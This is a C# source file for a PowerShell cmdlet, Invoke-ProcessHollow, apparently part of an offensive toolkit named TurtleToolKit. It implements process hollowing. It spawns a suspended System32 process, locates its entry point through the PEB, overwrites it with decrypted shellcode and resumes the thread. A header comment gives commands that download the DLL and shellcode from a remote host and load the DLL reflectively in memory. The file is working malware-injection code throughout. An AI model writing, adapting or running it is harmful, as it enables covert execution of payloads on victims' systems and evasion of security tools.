using System;
using System.Management.Automation;
using TurtleToolKitCrypt;


/*

reflective powershell load
$dll = $(IWR -Uri 'http://10.0.0.69/TurtleToolKit.dll').Content
$Assembly = [System.Reflection.Assembly]::Load($dll)
import-module -Assembly $Assembly                                              
Invoke-ClassicInjection

$responseObj = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content

*/

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke,"ProcessHollow")] // <- seeting cmdlet name and verbs
    [Alias("INVPH")] //<- cmdlet alias
    //[OutputType(typeof(ProcessHollowOutput))]       // <-- setting output type
    public class InvokeProcessHollow: Cmdlet
    {
        // to accept pipeline parameters
        // [Parameter(ValueFromPipelineByPropertyName = true)]
        // public bool PhysicalAdapter { get; set; }
        //
        //
        // Setting parameters for cmdlet
        [Parameter(Mandatory = true)] [Alias("pn")] public string procName { get; set; }
        /// PROCESS NAME WILL NEED TO BE IN SYSTEM32 DIRECTORY
        [Parameter(Mandatory = true)] [Alias("k")] public byte[] decryptKey { get; set; }
        [Parameter(Mandatory = true)] [Alias("encsh")] public byte[] shellCode { get; set; }
        [Parameter(Mandatory = true)] [Alias("ivk")] public byte[] initVector { get; set; }
        // Done setting cmdlet parameters

        // setting class parameters
        private Cryptor cryptObj;
        // Init cmdlet
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
            cryptObj = new Cryptor(decryptKey, initVector);
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // if no pipeline shellcode obj passed use cmdlet parameters
            if (!ExecuteProcessHollow(cryptObj, shellCode, procName))
            {
                WriteWarning("Failed to execute process hollow");
                return;
            }
            WriteVerbose("::: Successfully performed processhollow :::");
            return;

        }



        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing(){base.EndProcessing();}
        // Handle abnormal termination
        protected override void StopProcessing(){ base.StopProcessing();}


        private bool ExecuteProcessHollow(Cryptor crypt, byte[]payloadBytes, string processName)
        {
            TurtleToolKitManaged.Win32.STARTUPINFO si = new TurtleToolKitManaged.Win32.STARTUPINFO();
            TurtleToolKitManaged.Win32.PROCESS_INFORMATION pi = new TurtleToolKitManaged.Win32.PROCESS_INFORMATION();
            string path = "C:\\windows\\system32\\" + processName;
            bool res = TurtleToolKitManaged.Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION bi = new TurtleToolKitManaged.Win32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            Console.WriteLine(pi.dwProcessId);

            TurtleToolKitManaged.Win32.ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            Console.WriteLine(nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            TurtleToolKitManaged.Win32.ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            var decryptedBytes = crypt.DecryptBytes(payloadBytes);
            if (decryptedBytes == null)
            {
                Console.WriteLine("Failed to decrypt bytes");
                return false;
            }
            // Perform Decrypt heres
            TurtleToolKitManaged.Win32.WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedBytes, decryptedBytes.Length, out nRead);
            TurtleToolKitManaged.Win32.ResumeThread(pi.Thread);
            Console.WriteLine("::: Successfully Execute ProcessHollow via -> {0} :::", processName);
            return true;
        }

    }
}
